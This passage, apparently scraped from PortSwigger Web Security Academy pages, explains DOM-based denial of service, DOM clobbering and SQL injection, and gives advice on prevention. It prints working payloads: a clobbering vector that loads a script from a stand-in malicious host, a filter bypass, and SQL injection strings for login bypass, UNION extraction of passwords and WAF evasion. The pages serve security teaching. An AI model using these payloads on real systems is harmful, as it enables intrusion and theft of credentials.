vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based) \n*   [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n\nDOM-based denial of service\n===========================\n\nIn this section, we'll describe DOM-based denial-of-service vulnerabilities, look at which sinks can lead to this kind of vulnerability, and discuss ways to reduce your exposure to DOM-based DOS attacks.\n\nWhat is DOM-based denial of service?\n------------------------------------\n\nDOM-based denial-of-service vulnerabilities arise when a script passes attacker-controllable data in an unsafe way to a problematic platform API, such as an API whose invocation can cause the user's computer to consume excessive amounts of CPU or disk space. This may result in side effects if the browser restricts the functionality of the website, for example, by rejecting attempts to store data in `localStorage` or killing busy scripts.\n\nWhich sinks can lead to DOM-based denial-of-service vulnerabilities?\n--------------------------------------------------------------------\n\nThe following are some of the main sinks can lead to DOM-based denial-of-service vulnerabilities:\n\n```\nrequestFileSystem()\nRegExp()\n```\n\nHow to prevent DOM-based denial-of-service vulnerabilities\n----------------------------------------------------------\n\nIn addition to the general measures described on the [DOM-based vulnerabilities](https://portswigger.net/web-security/dom-based) page, you should avoid allowing data from any untrusted source to dynamically pass data into problematic platform APIs.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "DOM clobbering", "content": "### DOM-based vulnerabilities\n\n*   [What is the DOM?](https://portswigger.net/web-security/dom-based#what-is-the-dom)\n*    [Taint flow](https://portswigger.net/web-security/dom-based#what-is-taint-flow)\n    *    [Sources](https://portswigger.net/web-security/dom-based#common-sources)\n        *   [Reflected and stored data](https://portswigger.net/web-security/cross-site-scripting/dom-based#dom-xss-combined-with-reflected-and-stored-data)\n        *   [Web messages](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Example sinks](https://portswigger.net/web-security/dom-based#which-sinks-can-lead-to-dom-based-vulnerabilities)\n*   [DOM-based XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based)\n*    [Open redirection](https://portswigger.net/web-security/dom-based/open-redirection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/open-redirection#what-is-the-impact-of-dom-based-open-redirection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/open-redirection#which-sinks-can-lead-to-dom-based-open-redirection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/open-redirection#how-to-prevent-dom-based-open-redirection-vulnerabilities)\n*    [Cookie manipulation](https://portswigger.net/web-security/dom-based/cookie-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/cookie-manipulation#what-is-the-impact-of-a-dom-based-cookie-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/cookie-manipulation#which-sinks-can-lead-to-dom-based-cookie-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/cookie-manipulation#how-to-prevent-dom-based-cookie-manipulation-vulnerabilities)\n*    [JavaScript injection](https://portswigger.net/web-security/dom-based/javascript-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/javascript-injection#what-is-the-impact-of-a-dom-based-javascript-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/javascript-injection#which-sinks-can-lead-to-dom-based-javascript-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/javascript-injection#how-to-prevent-dom-based-javascript-injection-vulnerabilities)\n*    [Document-domain manipulation](https://portswigger.net/web-security/dom-based/document-domain-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/document-domain-manipulation#which-sinks-can-lead-to-dom-based-document-domain-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/document-domain-manipulation#how-to-prevent-dom-based-document-domain-manipulation-vulnerabilities)\n*    [WebSocket-URL poisoning](https://portswigger.net/web-security/dom-based/websocket-url-poisoning)\n    *   [Impact](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#what-is-the-impact-of-websocket-url-poisoning)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#which-sinks-can-lead-to-websocket-url-poisoning-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/websocket-url-poisoning#how-to-prevent-dom-based-websocket-url-poisoning-vulnerabilities)\n*    [Link manipulation](https://portswigger.net/web-security/dom-based/link-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/link-manipulation#what-is-the-impact-of-a-dom-based-link-manipulation-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/link-manipulation#which-sinks-can-lead-to-dom-based-link-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/link-manipulation#how-to-prevent-dom-based-link-manipulation-vulnerabilities)\n*    [Web message manipulation](https://portswigger.net/web-security/dom-based/web-message-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/web-message-manipulation#which-sinks-can-lead-to-dom-based-web-message-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/web-message-manipulation#how-to-prevent-dom-based-web-message-manipulation)\n*    [Ajax request-header manipulation](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#what-is-the-impact-of-dom-based-ajax-request-header-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#which-sinks-can-lead-to-dom-based-ajax-request-header-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/ajax-request-header-manipulation#how-to-prevent-dom-based-ajax-request-header-manipulation)\n*    [Local file-path manipulation](https://portswigger.net/web-security/dom-based/local-file-path-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#what-is-the-impact-of-dom-based-local-file-path-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#which-sinks-can-lead-to-dom-based-local-file-path-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/local-file-path-manipulation#how-to-prevent-dom-based-local-file-path-manipulation-vulnerabilities)\n*    [Client-side SQL injection](https://portswigger.net/web-security/dom-based/client-side-sql-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-sql-injection#what-is-the-impact-of-dom-based-client-side-sql-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-sql-injection#which-sinks-can-lead-to-dom-based-client-side-sql-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-sql-injection#how-to-prevent-dom-based-client-side-sql-injection-vulnerabilities)\n*    [HTML5-storage manipulation](https://portswigger.net/web-security/dom-based/html5-storage-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#which-sinks-can-lead-to-dom-based-html5-storage-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/html5-storage-manipulation#how-to-prevent-dom-based-html5-storage-manipulation-vulnerabilities)\n*    [Client-side XPath injection](https://portswigger.net/web-security/dom-based/client-side-xpath-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#what-is-the-impact-of-dom-based-xpath-injection)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#which-sinks-can-lead-to-xpath-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-xpath-injection#how-to-prevent-dom-based-xpath-injection-vulnerabilities)\n*    [Client-side JSON injection](https://portswigger.net/web-security/dom-based/client-side-json-injection)\n    *   [Impact](https://portswigger.net/web-security/dom-based/client-side-json-injection#what-is-the-impact-of-a-dom-based-json-injection-attack)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/client-side-json-injection#which-sinks-can-lead-to-dom-based-json-injection-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/client-side-json-injection#how-to-prevent-client-side-json-injection-vulnerabilities)\n*    [DOM-data manipulation](https://portswigger.net/web-security/dom-based/dom-data-manipulation)\n    *   [Impact](https://portswigger.net/web-security/dom-based/dom-data-manipulation#what-is-the-impact-of-dom-data-manipulation)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/dom-data-manipulation#which-sinks-can-lead-to-dom-data-manipulation-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-data-manipulation#how-to-prevent-dom-data-manipulation-vulnerabilities)\n*    [Denial of service](https://portswigger.net/web-security/dom-based/denial-of-service)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/denial-of-service#which-sinks-can-lead-to-dom-based-denial-of-service-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/denial-of-service#how-to-prevent-dom-based-denial-of-service-vulnerabilities)\n*    [Web message vulnerabilities](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)\n    *   [Impact](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#what-is-the-impact-of-dom-based-web-message-vulnerabilities)\n    *   [Constructing an attack](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#how-to-construct-an-attack-using-web-messages-as-the-source)\n    *   [Origin verification](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#origin-verification)\n    *   [Sinks](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source#which-sinks-can-lead-to-dom-based-web-message-vulnerabilities)\n*    [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n    *   [Exploiting](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-exploit-dom-clobbering-vulnerabilities)\n    *   [Preventing](https://portswigger.net/web-security/dom-based/dom-clobbering#how-to-prevent-dom-clobbering-attacks)\n*   [Preventing vulnerabilities](https://portswigger.net/web-security/dom-based#how-to-prevent-dom-based-taint-flow-vulnerabilities)\n*   [View all DOM-based vulnerability labs](https://portswigger.net/web-security/all-labs#dom-based-vulnerabilities)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [DOM-based](https://portswigger.net/web-security/dom-based)\n*   [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)\n\nDOM clobbering\n==============\n\nIn this section, we will describe what DOM clobbering is, demonstrate how you can exploit DOM vulnerabilities using clobbering techniques, and suggest ways you can reduce your exposure to DOM clobbering attacks.\n\nWhat is DOM clobbering?\n-----------------------\n\nDOM clobbering is a technique in which you inject HTML into a page to manipulate the DOM and ultimately change the behavior of JavaScript on the page. DOM clobbering is particularly useful in cases where [XSS](https://portswigger.net/web-security/cross-site-scripting) is not possible, but you can control some HTML on a page where the attributes `id` or `name` are whitelisted by the HTML filter. The most common form of DOM clobbering uses an anchor element to overwrite a global variable, which is then used by the application in an unsafe way, such as generating a dynamic script URL.\n\nThe term clobbering comes from the fact that you are \"clobbering\" a global variable or property of an object and overwriting it with a DOM node or HTML collection instead. For example, you can use DOM objects to overwrite other JavaScript objects and exploit unsafe names, such as `submit`, to interfere with a form's actual `submit()` function.\n\nHow to exploit DOM-clobbering vulnerabilities\n---------------------------------------------\n\nA common pattern used by JavaScript developers is:\n\n`var someObject = window.someObject || {};`If you can control some of the HTML on the page, you can clobber the `someObject` reference with a DOM node, such as an anchor. Consider the following code:\n\n```\n<script>\n    window.onload = function(){\n        let someObject = window.someObject || {};\n        let script = document.createElement('script');\n        script.src = someObject.url;\n        document.body.appendChild(script);\n    };\n</script>\n```To exploit this vulnerable code, you could inject the following HTML to clobber the `someObject` reference with an anchor element:\n\n`<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>`As the two anchors use the same ID, the DOM groups them together in a DOM collection. The DOM clobbering vector then overwrites the `someObject` reference with this DOM collection. A `name` attribute is used on the last anchor element in order to clobber the `url` property of the `someObject` object, which points to an external script.\n\nLAB\n\nEXPERT [Exploiting DOM clobbering to enable XSS](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering)\n\nAnother common technique is to use a `form` element along with an element such as `input` to clobber DOM properties. For example, clobbering the `attributes` property enables you to bypass client-side filters that use it in their logic. Although the filter will enumerate the `attributes` property, it will not actually remove any attributes because the property has been clobbered with a DOM node. As a result, you will be able to inject malicious attributes that would normally be filtered out. For example, consider the following injection:\n\n`<form onclick=alert(1)><input id=attributes>Click me`In this case, the client-side filter would traverse the DOM and encounter a whitelisted `form` element. Normally, the filter would loop through the `attributes` property of the `form` element and remove any blacklisted attributes. However, because the `attributes` property has been clobbered with the `input` element, the filter loops through the `input` element instead. As the `input` element has an undefined length, the conditions for the `for` loop of the filter (for example `i<element.attributes.length`) are not met, and the filter simply moves on to the next element instead. This results in the `onclick` event being ignored altogether by the filter, which subsequently allows the `alert()` function to be called in the browser.\n\nLAB\n\nEXPERT [Clobbering DOM attributes to bypass HTML filters](https://portswigger.net/web-security/dom-based/dom-clobbering/lab-dom-clobbering-attributes-to-bypass-html-filters)\n\nHow to prevent DOM-clobbering attacks\n-------------------------------------\n\nIn the simplest terms, you can prevent DOM-clobbering attacks by implementing checks to make sure that objects or functions are what you expect them to be. For instance, you can check that the attributes property of a DOM node is actually an instance of `NamedNodeMap`. This ensures that the property is an attributes property and not a clobbered HTML element.\n\nYou should also avoid writing code that references a global variable in conjunction with the logical OR operator `||`, as this can lead to DOM clobbering vulnerabilities.\n\nIn summary:\n\n*   Check that objects and functions are legitimate. If you are filtering the DOM, make sure you check that the object or function is not a DOM node.\n*   Avoid bad code patterns. Using global variables in conjunction with the logical OR operator should be avoided.\n*   Use a well-tested library, such as DOMPurify, that accounts for DOM-clobbering vulnerabilities.\n\n", "category": "DOM Based Vulnerabilities"}, {"title": "What is SQL Injection?", "content": "In this section, we explain:\n\n*   What SQL injection (SQLi) is.\n*   How to find and exploit different types of SQLi vulnerabilities.\n*   How to prevent SQLi.\n\n!\n\n#### Labs\n\nIf you're familiar with the basic concepts behind SQLi vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.\n\n*   [View all SQL injection labs](https://portswigger.net/web-security/all-labs#sql-injection)\n\nWhat is SQL injection (SQLi)?\n-----------------------------\n\nSQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.\n\nIn some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.\n\nWhat is the impact of a successful SQL injection attack?\n--------------------------------------------------------\n\nA successful SQL injection attack can result in unauthorized access to sensitive data, such as:\n\n*   Passwords.\n*   Credit card details.\n*   Personal user information.\n\nSQL injection attacks have been used in many high-profile data breaches over the years. These have caused reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.\n\nHow to detect SQL injection vulnerabilities\n-------------------------------------------\n\nYou can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:\n\n*   The single quote character `'` and look for errors or other anomalies.\n*   Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic differences in the application responses.\n*   Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.\n*   Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.\n*   [OAST](https://portswigger.net/burp/application-security-testing/oast) payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.\n\nAlternatively, you can find the majority of SQL injection vulnerabilities quickly and reliably using [Burp Scanner](https://portswigger.net/burp/vulnerability-scanner).\n\nSQL injection in different parts of the query\n---------------------------------------------\n\nMost SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. Most experienced testers are familiar with this type of SQL injection.\n\nHowever, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:\n\n*   In `UPDATE` statements, within the updated values or the `WHERE` clause.\n*   In `INSERT` statements, within the inserted values.\n*   In `SELECT` statements, within the table or column name.\n*   In `SELECT` statements, within the `ORDER BY` clause.\n\nSQL injection examples\n----------------------\n\nThere are lots of SQL injection vulnerabilities, attacks, and techniques, that occur in different situations. Some common SQL injection examples include:\n\n*   [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data), where you can modify a SQL query to return additional results.\n*   [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic), where you can change a query to interfere with the application's logic.\n*   [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks), where you can retrieve data from different database tables.\n*   [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind), where the results of a query you control are not returned in the application's responses.\n\nImagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:\n\n`https://insecure-website.com/products?category=Gifts`\n\nThis causes the application to make a SQL query to retrieve details of the relevant products from the database:\n\n`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`\n\nThis SQL query asks the database to return:\n\n*   all details (`*`)\n*   from the `products` table\n*   where the `category` is `Gifts`\n*   and `released` is `1`.\n\nThe restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.\n\nThe application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:\n\n`https://insecure-website.com/products?category=Gifts'--`\n\nThis results in the SQL query:\n\n`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`\n\nCrucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.\n\nYou can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:\n\n`https://insecure-website.com/products?category=Gifts'+OR+1=1--`\n\nThis results in the SQL query:\n\n`SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`\n\nThe modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.\n\n#### Warning\n\nTake care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.\n\nSubverting application logic\n----------------------------\n\nImagine an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:\n\n`SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'`\n\nIf the query returns the details of a user, then the login is successful. Otherwise, it is rejected.\n\nIn this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:\n\n`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`\n\nThis query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user.\n\nRetrieving data from other database tables\n------------------------------------------\n\nIn cases where the application responds with the results of a SQL query, an attacker can use a SQL injection vulnerability to retrieve data from other tables within the database. You can use the `UNION` keyword to execute an additional `SELECT` query and append the results to the original query.\n\nFor example, if an application executes the following query containing the user input `Gifts`:\n\n`SELECT name, description FROM products WHERE category = 'Gifts'`\n\nAn attacker can submit the input:\n\n`' UNION SELECT username, password FROM users--`\n\nThis causes the application to return all usernames and passwords along with the names and descriptions of products.\n\nBlind SQL injection vulnerabilities\n-----------------------------------\n\nMany instances of SQL injection are blind vulnerabilities. This means that the application does not return the results of the SQL query or the details of any database errors within its responses. Blind vulnerabilities can still be exploited to access unauthorized data, but the techniques involved are generally more complicated and difficult to perform.\n\nThe following techniques can be used to exploit blind SQL injection vulnerabilities, depending on the nature of the vulnerability and the database involved:\n\n*   You can change the logic of the query to trigger a detectable difference in the application's response depending on the truth of a single condition. This might involve injecting a new condition into some Boolean logic, or conditionally triggering an error such as a divide-by-zero.\n*   You can conditionally trigger a time delay in the processing of the query. This enables you to infer the truth of the condition based on the time that the application takes to respond.\n*   You can trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not. Often, you can directly exfiltrate data via the out-of-band channel. For example, you can place the data into a DNS lookup for a domain that you control.\n\nSecond-order SQL injection\n--------------------------\n\nFirst-order SQL injection occurs when the application processes user input from an HTTP request and incorporates the input into a SQL query in an unsafe way.\n\nSecond-order SQL injection occurs when the application takes user input from an HTTP request and stores it for future use. This is usually done by placing the input into a database, but no vulnerability occurs at the point where the data is stored. Later, when handling a different HTTP request, the application retrieves the stored data and incorporates it into a SQL query in an unsafe way. For this reason, second-order SQL injection is also known as stored SQL injection.\n\n!\n\nSecond-order SQL injection often occurs in situations where developers are aware of SQL injection vulnerabilities, and so safely handle the initial placement of the input into the database. When the data is later processed, it is deemed to be safe, since it was previously placed into the database safely. At this point, the data is handled in an unsafe way, because the developer wrongly deems it to be trusted.\n\nExamining the database\n----------------------\n\nSome core features of the SQL language are implemented in the same way across popular database platforms, and so many ways of detecting and exploiting SQL injection vulnerabilities work identically on different types of database.\n\nHowever, there are also many differences between common databases. These mean that some techniques for detecting and exploiting SQL injection work differently on different platforms. For example:\n\n*   Syntax for string concatenation.\n*   Comments.\n*   Batched (or stacked) queries.\n*   Platform-specific APIs.\n*   Error messages.\n\nAfter you identify a SQL injection vulnerability, it's often useful to obtain information about the database. This information can help you to exploit the vulnerability.\n\nYou can query the version details for the database. Different methods work for different database types. This means that if you find a particular method that works, you can infer the database type. For example, on Oracle you can execute:\n\n`SELECT * FROM v$version`\n\nYou can also identify what database tables exist, and the columns they contain. For example, on most databases you can execute the following query to list the tables:\n\n`SELECT * FROM information_schema.tables`\n\nSQL injection in different contexts\n-----------------------------------\n\nIn the previous labs, you used the query string to inject your malicious SQL payload. However, you can perform SQL injection attacks using any controllable input that is processed as a SQL query by the application. For example, some websites take input in JSON or XML format and use this to query the database.\n\nThese different formats may provide different ways for you to [obfuscate attacks](https://portswigger.net/web-security/essential-skills/obfuscating-attacks-using-encodings#obfuscation-via-xml-encoding) that are otherwise blocked due to WAFs and other defense mechanisms. Weak implementations often look for common SQL injection keywords within the request, so you may be able to bypass these filters by encoding or escaping characters in the prohibited keywords. For example, the following XML-based SQL injection uses an XML escape sequence to encode the `S` character in `SELECT`:\n\n```\n<stockCheck>\n    <productId>123</productId>\n    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>\n</stockCheck>\n```\n\nThis will be decoded server-side before being passed to the SQL interpreter.\n\nHow to prevent SQL injection\n----------------------------\n\nYou can prevent most instances of SQL injection using parameterized queries instead of string concatenation within the query. These parameterized queries are also know as \"prepared statements\".\n\nThe following code is vulnerable to SQL injection because the user input is concatenated directly into the query:\n\n```\nString query = \"SELECT * FROM products WHERE category = '\"+ input + \"'\";\nStatement statement = connection.createStatement();\nResultSet resultSet = statement.executeQuery(query);\n```\n\nYou can rewrite this code in a way that prevents the user input from interfering with the query structure:\n\n```\nPreparedStatement statement = connection.prepareStatement(\"SELECT * FROM products WHERE category = ?\");\nstatement.setString(1, input);\nResultSet resultSet = statement.executeQuery();\n```\n\nYou can use parameterized queries for any situation where untrusted input appears as data within the query, including the `WHERE` clause and values in an `INSERT` or `UPDATE` statement. They can't be used to handle untrusted input in other parts of the query, such as table or column names, or the `ORDER BY` clause. Application functionality that places untrusted data into these parts of the query needs to take a different approach, such as:\n\n*   Whitelisting permitted input values.\n*   Using different logic to deliver the required behavior.\n\nFor a parameterized query to be effective in preventing SQL injection, the string that is used in the query must always be a hard-coded constant. It must never contain any variable data from any origin. Do not be tempted to decide case-by-case whether an item of data is trusted, and continue using string concatenation within the query for cases that are considered safe. It's easy to make mistakes about the possible origin of data, or for changes in other code to taint trusted data.\n", "category": "SQLi"}, {"title": "Examining the database", "content": "### SQL injection\n\n*   [What is SQL injection?](https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli)\n*   [What is the impact of SQL injection?](https://portswigger.net/web-security/sql-injection#what-is-the-impact-of-a-successful-sql-injection-attack)\n*    [Detecting SQL injection vulnerabilities](https://portswigger.net/web-security/sql-injection#how-to-detect-sql-injection-vulnerabilities)\n    *   [In different parts of the query](https://portswigger.net/web-security/sql-injection#sql-injection-in-different-parts-of-the-query)\n    *   [In different contexts](https://portswigger.net/web-security/sql-injection#sql-injection-in-different-contexts)\n*    [Examples of SQL injection](https://portswigger.net/web-security/sql-injection#sql-injection-examples)\n    *   [Retrieving hidden data](https://portswigger.net/web-security/sql-injection#retrieving-hidden-data)\n    *   [Subverting application logic](https://portswigger.net/web-security/sql-injection#subverting-application-logic)\n    *   [Retrieving data from other tables](https://portswigger.net/web-security/sql-injection#retrieving-data-from-other-database-tables)\n    *   [Examining the database](https://portswigger.net/web-security/sql-injection#examining-the-database)\n    *   [Blind SQL injection](https://portswigger.net/web-security/sql-injection#blind-sql-injection-vulnerabilities)\n    *   [Second-order SQL injection](https://portswigger.net/web-security/sql-injection#second-order-sql-injection)\n*    [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)\n    *   [Querying the type and version](https://portswigger.net/web-security/sql-injection/examining-the-database#querying-the-database-type-and-version)\n    *   [Listing the contents](https://portswigger.net/web-security/sql-injection/examining-the-database#listing-the-contents-of-the-database)\n*    [UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)\n    *   [Determining the number of columns](https://portswigger.net/web-security/sql-injection/union-attacks#determining-the-number-of-columns-required)\n    *   [Finding columns with a useful data type](https://portswigger.net/web-security/sql-injection/union-attacks#finding-columns-with-a-useful-data-type)\n    *   [Retrieving interesting data](https://portswigger.net/web-security/sql-injection/union-attacks#using-a-sql-injection-union-attack-to-retrieve-interesting-data)\n    *   [Retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks#retrieving-multiple-values-within-a-single-column)\n*    [Blind SQL injection](https://portswigger.net/web-security/sql-injection/blind)\n    *   [What is blind SQL injection?](https://portswigger.net/web-security/sql-injection/blind#what-is-blind-sql-injection)\n    *   [Triggering conditional responses](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-responses)\n    *    [Error-based SQL injection](https://portswigger.net/web-security/sql-injection/blind#error-based-sql-injection)\n        *   [Inferring information using conditional errors](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-conditional-errors)\n        *   [Extracting data via verbose error messages](https://portswigger.net/web-security/sql-injection/blind#extracting-sensitive-data-via-verbose-sql-error-messages)\n    *   [Triggering time delays](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-by-triggering-time-delays)\n    *   [Out-of-band (OAST) techniques](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)\n    *   [Preventing blind SQL injection](https://portswigger.net/web-security/sql-injection/blind#how-to-prevent-blind-sql-injection-attacks)\n*   [How to prevent SQL injection](https://portswigger.net/web-security/sql-injection#how-to-prevent-sql-injection)\n*   [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)\n*   [View all SQL injection labs](https://portswigger.net/web-security/all-labs#sql-injection)\n\n*   [Web Security Academy](https://portswigger.net/web-security)\n*   [SQL injection](https://portswigger.net/web-security/sql-injection)\n*   [Examining the database](https://portswigger.net/web-security/sql-injection/examining-the-database)\n\nExamining the database in SQL injection attacks\n===============================================\n\nTo exploit [SQL injection](https://portswigger.net/web-security/sql-injection) vulnerabilities, it's often necessary to find information about the database. This includes:\n\n*   The type and version of the database software.\n*   The tables and columns that the database contains.\n\nQuerying the database type and version\n--------------------------------------\n\nYou can potentially identify both the database type and version by injecting provider-specific queries to see if one works\n\nThe following are some queries to determine the database version for some popular database types:\n\nDatabase type\n\nQuery\n\nMicrosoft, MySQL\n\n```\n\n            SELECT @@version\n        \n```\n\nOracle\n\n```\n\n            SELECT * FROM v$version\n        \n```\n\nPostgreSQL\n\n```\n\n            SELECT version()\n        \n```\n\nFor example, you could use a `UNION` attack with the following input:\n\n`' UNION SELECT @@version--`This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:\n\n```\nMicrosoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)\nMar 18 2018 09:11:49\nCopyright (c) Microsoft Corporation\nStandard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)\n```\n\nLAB\n\nPRACTITIONER [SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)\n\nLAB\n\nPRACTITIONER [SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)\n\nListing the contents of the database\n------------------------------------\n\nMost database types (except Oracle) have a set of views called the information schema. This provides information about the database.\n\nFor example, you can query 